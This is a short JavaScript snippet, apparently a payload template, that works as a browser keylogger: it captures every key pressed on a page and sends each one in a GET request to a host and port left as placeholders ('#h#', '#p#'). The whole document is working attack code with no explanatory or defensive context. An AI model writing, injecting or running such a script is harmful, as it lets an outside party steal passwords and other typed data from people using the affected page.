const request = new XMLHttpRequest();
document.addEventListener('keydown', logKey);
function logKey(e) {
  console.log(` ${e.code}`);
  var key = ` ${e.code}`;
  var url = "http://#h#:#p#/key?key="+key
  request.open("GET",url);
  request.send();
}
